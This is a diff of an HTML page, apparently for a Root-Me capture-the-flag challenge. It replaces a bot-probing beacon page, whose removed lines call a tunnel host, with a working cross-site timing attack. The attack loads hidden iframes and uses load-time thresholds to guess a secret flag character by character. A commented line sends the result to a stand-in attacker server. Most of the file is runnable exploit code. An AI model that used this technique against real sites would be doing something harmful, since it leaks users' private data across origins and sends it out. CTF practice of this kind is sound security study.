@@ -1,18 +1,75 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Bot Capability Test</title>
-    <style>
-        @import url('https://8947e405a38b9a.lhr.life/test-css-import');
-    </style>
-</head>
 <body>
-    <h1>Bot Debug Page</h1>
-
-    <img src="https://8947e405a38b9a.lhr.life/test-img-src" width="1" height="1">
-
+    <h1>Leaking in progress... Check the console (F12).</h1>
     <script>
-        fetch('https://8947e405a38b9a.lhr.life/test-script-fetch');
+        async function leak() {
+            // 공격 대상 URL (실제 CTF 환경의 URL로 변경해야 합니다)
+            const TARGET_URL = "https://web-client-ch56.challenge01.root-me.org:58056/notes/1710/";
+            
+            // 추측할 문자 집합
+            const charset = "abcdefghijklmnopqrstuvwxyz0123456789_{}";
+            
+            let flag = "";
+            console.log("Attack started!");
+
+            while (true) {
+                let foundChar = false;
+                for (const char of charset) {
+                    const currentGuess = flag + char;
+                    
+                    // Promise를 사용하여 비동기 시간 측정을 동기식으로 처리
+                    const isMatch = await checkTime(TARGET_URL + encodeURIComponent(currentGuess));
+
+                    if (isMatch) {
+                        flag += char;
+                        console.log("Found:", flag);
+                        foundChar = true;
+                        break; // 다음 글자로 넘어감
+                    }
+                }
+
+                if (!foundChar || flag.endsWith("}")) {
+                    console.log("Attack finished! Leaked flag:", flag);
+                    // 실제 공격에서는 이 결과를 공격자 서버로 전송합니다.
+                    // fetch("https://your-server.com/log?flag=" + flag);
+                    break;
+                }
+            }
+        }
+
+        function checkTime(url) {
+            // Promise를 반환하여 비동기 작업의 완료를 기다릴 수 있게 함
+            return new Promise(resolve => {
+                const iframe = document.createElement('iframe');
+                iframe.style.display = "none"; // 화면에 보이지 않게 처리
+
+                let startTime;
+
+                iframe.onload = () => {
+                    const duration = performance.now() - startTime;
+                    document.body.removeChild(iframe); // 테스트 후 iframe 제거
+
+                    // 임계값 설정. 250ms(setTimeout) + α
+                    // 매치되었을 때 서버 처리 시간이 길어지므로, 350ms 이상 걸리면 매치로 간주
+                    const THRESHOLD = 350; 
+                    
+                    if (duration > THRESHOLD) {
+                        resolve(true); // 시간이 오래 걸림 -> 정답
+                    } else {
+                        resolve(false); // 시간이 짧음 -> 오답
+                    }
+                };
+                
+                // iframe의 src를 설정하기 직전에 시간 측정 시작
+                startTime = performance.now();
+                iframe.src = url;
+                document.body.appendChild(iframe);
+            });
+        }
+
+        // 공격 시작
+        leak();
     </script>
 </body>
 </html>
